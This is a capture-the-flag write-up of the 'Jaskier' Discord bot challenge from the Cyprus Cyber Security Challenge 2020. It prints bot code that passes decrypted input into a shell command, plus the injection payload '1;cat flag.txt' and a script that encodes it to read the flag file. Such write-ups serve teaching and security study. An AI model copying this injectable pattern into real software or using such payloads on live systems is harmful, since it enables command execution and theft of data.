# CCSC2020
## WriteUps for the Cyprus Cyber Security Challenge

![Jaskier Challenge](Jaskier.JPG)

At this challenge, we were 
ded with an automated Discord bot - Jaskier - which had the following functionalities:
!help !frappe !ls !pwd !viewcode <function> !revenc <string>

###!help

| Jaskier: |
==============================
*!frappe*
*Return a frappe for you*

*!ls*
*Returns the contents of the home directory*

*!pwd*
Returns the current directory

*!viewcode <function>
*Returns the code of the given function. Be careful with that one!
*Available functions: decrypt, hmask, h_rotl, blockify, cnt, revenc, pwd, ls, frappe

*!revenc <string>
*Reverses an encrypted string
*Example of reversing 'Hello World': !revenc SJVsbG9Ap2+yzGEA|

Thus I started playing around with these functions
The result of !ls returned 4 files:
.bashrc
.profile
.bash_logout
flag.txt

The goal became obvious: *Find a way to inject code from the revenc function so that to cat the flag.txt file and get the flag*. 

After gathering all the functions together with the help of the !viewsource function, and reassemblying the parts together I was  able to view the complete source code of the bot:

```python
BLOCK_SIZE = 2
TABLE_DIM = 4

def decrypt(ct):
    dec = [] 
    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
    for blk in blocks:
        blk_int = int.from_bytes(blk, byteorder='big')
        for n in range(TABLE_DIM, -1, -1):
            a,b = cnt(blk_int, TABLE_DIM, n)
            blk_int = h_rotl(blk_int, a, TABLE_DIM, b)
        dec.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
    return b''.join(dec).strip(b'\x00')
def hmask(size, idx):
    return 2**size-1 << idx*size
#masking: setting size-1 bits on and shift them by idx*size 

def h_rotl(pt, rot, size, idx):
    """
    Horizontal left rotation. 
    """
    m = hmask(size, idx)
    blk = pt & m 
    #turning off idx*size bites from pt
    rot = rot % size
    #modulo
    r = ((blk << rot) | (blk >> (size - rot))) & m
    return pt ^ blk | r

def blockify(inpt, size, pad):
    return [inpt[i:i+size].ljust(size, pad) for i in range(0, len(inpt), size)]
    
def cnt(pt, size, idx):
    a,b = 0,0
    pt = pt >> idx * size
    for _ in range(size):
        if pt % 2 == 0: a+=1 
        else: b += 1 
        pt = pt >> 1
    return a,b

def revenc(ctx, params):
    try:
        dec_in = decrypt(base64.b64decode(params)).decode('utf-8')
        getResult = subprocess.Popen(f'echo {dec_in} | rev', shell=True, stdout=subprocess.PIPE).stdout
        result = getResult.read()
        await ctx.channel.send(result.decode())
        print(dec_in)
    except Exception as e:
        print(e)
        await ctx.channel.send("Ops, something went wrong..")  
```
This particular line caught my attention, since it was passing the result of the decryption function into a subprosess as a variable {dec_in} via shell (shell = True)! 
```python 
        getResult = subprocess.Popen(f'echo {dec_in} | rev', shell=True, stdout=subprocess.PIPE).stdout
```
Therefore all the environment variables and file globs could be accessed if we could inject the payload "1;cat flag.txt". 
By using the semicolon, we escape the brackets {}, and we assign the value 1 to the variable dec_in and we close the first argument. Then we can execute the command cat and extract the data from the flag file and voila, we have the flag.

The problem now is how can we assign these value to the dec_in variable.

Since we can only view the decryption function, we should create an encryption function, which will be encapsulating the string "1;cat flag.txt" to a form that after being decrypted would result to that plaintext in byte-form.

### Reversing the algorithm:

The cipher text was firstly been "blockified" into 4 by 4 blocks and then padded with null characters so that to match the desired size. Then with hmask() the blocks were shifted horizontaly using the parameters a and b. Since the shifting wasn't constant we had to construct an encyption function and take advantage of the existing cnt() function so that to   the value of a and b. 

### The solution:

The only thing left is to reverse the shifting in the h_rotr() function. Thus by providing the plaintext it can encode it using the same process in reverse. Then we encrypt the result in base 64 since at the decryption process is decrypted from base64 to bytes. Here is the complete source code.
```python
import base64
BLOCK_SIZE = 2
TABLE_DIM = 4

def h_rotr(pt, rot, size, idx):
  m = hmask(size, idx)
  blk = pt & m
  rot = rot % size
  r = ((blk >> rot) | (blk << (size - rot)))  & m #We change the shifting to reverse the decryption process
  return pt ^ blk | r

def encrypt(pt):
  enc = []
  blocks = blockify(pt, BLOCK_SIZE, b'\x00')
  for blk in blocks:
      blk_int = int.from_bytes(blk, byteorder='big')
      for n in range(TABLE_DIM):
          a,b = cnt(blk_int, TABLE_DIM, n)
          blk_int = h_rotr(blk_int, a, TABLE_DIM, b)
      enc.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
  print(enc)
  return b''.join(enc)
  
def blockify(inpt, size, pad):
  return [inpt[i:i+size].ljust(size, pad) for i in range(0, len(inpt), size)]

def cnt(pt, size, idx):
  a,b = 0,0
  pt = pt >> idx * size
  for _ in range(size):
    if pt % 2 == 0: a+=1 
    else: b += 1 
    pt = pt >> 1
  return a,b

def hmask(size, idx):
  return 2**size-1 << idx*size

s = b'1;cat flag.txt'
print(s)
a = base64.b64encode(encrypt(s))
print(a)
```
We pass the output to the Jaskier bot and we get the flag
!revenc kWtswbSAZmwxx47U2NQ=
###flag: CCSC{w1th_g3r4lt_0f_R1via_al0ng_c4me_th1s_b0t}
